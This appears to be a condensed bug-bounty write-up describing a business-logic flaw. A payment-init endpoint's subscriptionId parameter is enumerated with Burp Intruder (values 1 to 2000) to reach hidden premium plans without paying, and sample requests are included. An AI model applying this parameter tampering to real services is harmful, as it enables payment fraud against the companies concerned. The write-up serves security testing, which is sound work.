---
id: 0cc8aada8fcd
title: "Is It Possible to Get an $850 Subscription Plan With Only $0?"
source_url: https://medium.com/@0xMo7areb/is-it-possible-to-get-an-850-subscription-plan-with-only-0-e175200b6549
author: "0xMo7areb"
publication_date: 2026-08-23
category: business-logic
category_label: "Business Logic"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "cybersecurity"
  - "technology"
  - "penetration-testing"
  - "writing"
  - "bug-bounty"
tools:
  - "Burp Intruder"
quick_test: "Test for hidden subscription IDs by manipulating the subscriptionId parameter during the payment process."
---

## Use case

The application allows users to create payment sessions using a subscriptionId parameter, which can be manipulated to access hidden subscription plans, including high-value plans for free. This vulnerability could lead to financial loss for the company as users can activate premium subscriptions without payment.

## Steps to test

1. Create a normal account.
2. Open the subscription page and note the displayed plans.
3. Intercept the request to POST /en/user/billing/payment/stripe/init with subscriptionId=25.
4. Send the request to Burp Intruder.
5. Test subscriptionId values from 1 to 2000.
6. Select a hidden subscription ID that returns a high-value plan.

## Commands

```text
POST /en/user/billing/payment/stripe/init HTTP/2
Content-Type: application/x-www-form-urlencoded
subscriptionId=25
subscriptionId=1
subscriptionId=2
subscriptionId=1041
POST /en/user/billing/payment/stripe/init HTTP/2
Content-Type: application/x-www-form-urlencoded
1
2
3
4
...
2000
{
"status": "ok",
"message": {
"redirectUrl": null,
"publicKey": "pk_live_...",
"sessionId": "cs_live_..."
}
}
POST /en/user/billing/payment/stripe/init HTTP/2
.....
subscriptionId=25
```

## Source

- Author: 0xMo7areb
- Writeup: https://medium.com/@0xMo7areb/is-it-possible-to-get-an-850-subscription-plan-with-only-0-e175200b6549

_For authorized testing only. Credit the original author._
